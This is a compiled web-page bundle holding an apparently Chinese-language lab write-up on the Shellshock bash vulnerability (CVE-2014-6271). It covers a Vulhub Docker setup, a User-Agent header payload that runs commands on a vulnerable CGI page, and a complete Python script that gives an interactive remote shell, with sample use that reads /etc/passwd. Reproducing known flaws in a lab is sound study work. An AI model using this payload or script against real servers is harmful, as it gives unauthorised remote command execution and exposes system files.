import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{o as s,c as a,e}from"./app-58e4a7d6.js";const t={},p=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p><p>此前已验证Red Hat、 CentOS 、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10均拥有存在CVE-2014-6271漏洞的bash版本，以bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用bash的Unix、Linux、Mac OS X，针对这些操作系统管理下的数据存在高危威胁。</p><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>将payload附在User-Agent中访问victim.cgi：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>命令成功被执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031506623.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>同样的数据包访问safe.cgi，不受影响：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203031505938.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞exp" tabindex="-1"><a class="header-anchor" href="#漏洞exp" aria-hidden="true">#</a> 漏洞EXP</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token comment">#!/usr/bin/python</span>

<span class="token comment"># Successful Output:</span>
<span class="token comment"># # python shell_shocker.py &lt;VulnURL&gt;</span>
<span class="token comment"># [+] Attempting Shell_Shock - Make sure to type full path</span>
<span class="token comment"># ~$ /bin/ls /</span>
<span class="token comment"># bin</span>
<span class="token comment"># boot</span>
<span class="token comment"># dev</span>
<span class="token comment"># etc</span>
<span class="token comment"># ..</span>
<span class="token comment"># ~$ /bin/cat /etc/passwd</span>

<span class="token keyword">from</span> __future__ <span class="token keyword">import</span> print_function
<span class="token keyword">from</span> future <span class="token keyword">import</span> standard_library
standard_library<span class="token punctuation">.</span>install_aliases<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">from</span> builtins <span class="token keyword">import</span> <span class="token builtin">input</span>
<span class="token keyword">import</span> sys<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>parse

<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;Usage: shell_shocker &lt;URL&gt;&quot;</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

URL<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;[+] Attempting Shell_Shock - Make sure to type full path&quot;</span><span class="token punctuation">)</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        command<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;~$ &quot;</span><span class="token punctuation">)</span>
        opener<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>build_opener<span class="token punctuation">(</span><span class="token punctuation">)</span>
        opener<span class="token punctuation">.</span>addheaders<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">&#39;User-agent&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;() { foo;}; echo Content-Type: text/plain ; echo ; &#39;</span><span class="token operator">+</span>command<span class="token punctuation">)</span><span class="token punctuation">]</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
                response<span class="token operator">=</span>opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>URL<span class="token punctuation">)</span>
                <span class="token keyword">for</span> line <span class="token keyword">in</span> response<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,16),i=[p];function o(c,l){return s(),a("div",null,i)}const d=n(t,[["render",o],["__file","Shellshock 破壳漏洞 CVE-2014-6271.html.vue"]]);export{d as default};
